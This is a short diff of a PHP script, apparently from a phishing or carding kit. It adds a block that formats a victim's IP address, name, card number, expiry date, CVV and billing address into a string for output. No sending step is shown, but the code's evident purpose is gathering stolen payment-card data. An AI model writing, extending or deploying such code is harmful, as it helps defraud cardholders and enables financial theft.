@@ -77,7 +77,16 @@ zip code : $postal_code<br>
 ip : $ip<br>
 ---------------------";
 
-
+$data ="$ip
+name : $name
+card : $card
+exp : $day-$mm
+cvv : $cvv
+---- $zayad ----
+address : $line1
+city : $city
+state : $state
+zip code : $postal_code";
 
 echo " $data //";
 
